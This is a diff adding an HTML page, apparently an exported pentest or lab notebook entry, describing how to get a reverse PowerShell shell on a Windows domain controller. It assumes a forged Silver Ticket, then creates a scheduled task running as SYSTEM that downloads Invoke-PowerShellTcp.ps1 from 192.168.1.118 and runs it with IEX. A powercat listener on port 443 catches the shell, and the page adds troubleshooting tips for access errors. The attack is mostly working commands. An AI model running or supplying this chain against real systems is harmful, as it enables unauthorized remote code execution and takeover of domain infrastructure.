@@ -1,0 +1,63 @@
+<!doctype html>
+<html>
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Schedule Reverse Powershell(option 2)</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+
+<body>
+  <div class='page'>
+    <h1 class='title'>Schedule Reverse Powershell(option 2)</h1><br />Github InvokePowershellTcp.ps1: <a
+      href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" target="_blank">https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</a><br />Github
+    powercat.ps1: <a
+      href="https://github.com/besimorhino/powercat/blob/master/powercat.ps1" target="_blank">https://github.com/besimorhino/powercat/blob/master/powercat.ps1</a><br />schtasks
+    single and double quotes problem: <a
+      href="https://stackoverflow.com/questions/26400674/single-quotes-in-schtasks-command" target="_blank">https://stackoverflow.com/questions/26400674/single-quotes-in-schtasks-command</a><br /><br />2.
+    Download <em>Invoke-PowerShellTcp.ps1</em> from <a
+      href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" target="_blank">https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</a>
+    and at the end of the file add Invoke-PowerShellTcp -Reverse -IpAddress [AttackerIP] -Port [AttackerPort]<br /> <a
+      href=""><img src="images/1152-1.png" alt="images/1152-1.png" /></a><br />3. Use a program to make a HTTP File
+    Server like <a href="https://www.rejetto.com/hfs/?f=dl">HFS</a>. And upload the just edited
+    <em>Invoke-PowerShellTcp.ps1</em><br /> <a href=""><img src="images/1152-2.png"
+        alt="images/1152-2.png" /></a><br />5. Schedule and execute a task <br /> Remember that the value of /TR cannot
+    be more than 261 characters. <br /> schtasks does not allow use single quotes because of that we had to use a lot of
+    backslash(\), and backtip(`). <br /> This is been explained on this <a
+      href="https://stackoverflow.com/questions/26400674/single-quotes-in-schtasks-command" target="_blank">post of stackoverflow</a>.
+    We can summarize it by saying that when we use <span style="text-decoration:underline;">schtasks</span> we have to
+    use:<br /> ▪ Quotes “ → ” <br /> ▪ SubQuotes → \`&quot; <br /> ▪ SubSubQuotes → \\\`&quot;<br />
+    <div class="codebox">
+      <div class="codebox">
+        PS&gt;&nbsp;schtasks&nbsp;/create&nbsp;/S&nbsp;testdc.daniele.local&nbsp;/SC&nbsp;Weekly&nbsp;/RU&nbsp;&quot;NT&nbsp;Authority\SYSTEM&quot;&nbsp;/TN&nbsp;&quot;STCheck&quot;&nbsp;/TR&nbsp;&quot;powershell.exe&nbsp;-nop&nbsp;-exec&nbsp;bypass&nbsp;-c&nbsp;\`&quot;IEX(New-Object&nbsp;Net.WebClient).DownloadString(\\\`&quot;http://192.168.1.118/Invoke-PowerShellTcp.ps1\\\`&quot;);&nbsp;\`&quot;&quot;
+      </div>
+    </div> <br /> ◇ If we give us: &quot;<span style="color:#ff0000;">ERROR:Access Denied</span>&quot; maybe is because
+    the Silver Ticket is older than 20 minutes. This mean we have to remake it(Point 1)<br /> ◇ If we give use: “<span
+      style="color:#ff0000;">ERROR: No mapping between account names and security IDs was done</span>” maybe the
+    username for /RU [username] does not exist.<br /> try “Administrator” or &quot;NT Authority\SYSTEM&quot; <br /> <a
+      href=""><img src="images/1152-3.png" alt="images/1152-3.png" /></a><br /> If we have access to the Windows Server,
+    we can go to:<br /> <em>Server Manager → Tools → Task Manager → Task Schedule Library → right click on our task →
+      Proprieties → Actions</em><br /> we can see that the command will be reinterpreted and executed like that by the
+    Windows Server:<br /> <a href=""><img src="images/1152-4.png" alt="images/1152-4.png" /></a><br /> <br /> <br />6.
+    We can check if the task is been created by querying the server:<br />
+    <div class="codebox">
+      <div class="codebox">PS&gt;&nbsp;schtasks&nbsp;/query&nbsp;/S&nbsp;testdc.daniele.local</div>
+    </div><br /> <a href=""><img src="images/1152-5.png" alt="images/1152-5.png" /></a><br />7. Now we have to create a
+    channel listening on our machine on the Port specified(in our case 443)<br />
+    <div class="codebox">
+      <div class="codebox">
+        PS&gt;&nbsp;IEX(New-Object&nbsp;Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&quot;)<br />PS&gt;&nbsp;powercat&nbsp;-l&nbsp;-v&nbsp;-p&nbsp;443&nbsp;-t&nbsp;1000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#listening&nbsp;on&nbsp;port&nbsp;443
+      </div>
+    </div><br /> <a href=""><img src="images/1152-6.png" alt="images/1152-6.png" /></a><br />8. Now we can run the
+    scheduled task “STCheck” created before<br />
+    <div class="codebox">
+      <div class="codebox">
+        PS&gt;&nbsp;schtasks&nbsp;/Run&nbsp;/S&nbsp;testdc.daniele.local&nbsp;/TN&nbsp;&quot;STCheck&quot;</div>
+    </div><br /> <a href=""><img src="images/1152-7.png" alt="images/1152-7.png" /></a><br /><br />-nop -exec bypass -c
+    &quot;IEX(New-Object Net.WebClient).DownloadString(\&quot;<a href="http://192.168.1.118/Invoke-PowerShellTcp.ps1\"
+      );">http://192.168.1.118/Invoke-PowerShellTcp.ps1\&quot;);</a> &quot;<br />
+  </div>
+</body>
+
+</html>
